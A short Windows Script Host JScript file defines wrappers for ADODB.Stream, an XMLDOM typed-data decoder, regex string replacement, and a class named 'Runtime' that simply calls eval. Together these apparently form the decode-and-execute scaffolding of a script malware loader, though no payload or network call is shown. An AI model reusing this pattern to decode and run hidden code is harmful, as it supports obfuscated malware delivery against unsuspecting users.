function AdoStream(){
	this.str = WSH.CreateObject("adodb.stream");
}
AdoStream.prototype.getTextValue = function(){
	return this.str.ReadText();
}
AdoStream.prototype.setType = function(value){
	this.str.Type = value;
}
AdoStream.prototype.writeToStream = function(value){
	this.str.Write(value);
}
AdoStream.prototype.setPosition = function(value){
	this.str.Position = value;
}
AdoStream.prototype.setCharset = function(value){
	this.str.CharSet = value;
}
AdoStream.prototype.openStream = function(){
	this.str.Open();
}
function Runtime(){
	this.runt = eval;
}
Runtime.prototype.getRuntime = function(){
	return this;
}
Runtime.prototype.exec = function(value){
	this.runt(value);
}
function MsXmlObj(){
	this.str = WSH.CreateObject("microsoft.xmldom");
}
MsXmlObj.prototype._init_ = function(){
	this.str = this.str.createElement("stv");
}
MsXmlObj.prototype.writeText = function(txt){
	this.str.text = txt;
}
MsXmlObj.prototype.setType = function(typ){
	this.str.dataType = typ;
}
MsXmlObj.prototype.getData = function(){
	return this.str.nodeTypedValue;
}
function StringBuilder(strg){
	this.str = strg;
}
StringBuilder.prototype.replace = function(search, rep){
	this.str = this.str.replace(new RegExp(search, "g"), rep);
}
StringBuilder.prototype.toString= function(){
	return this.str;
}

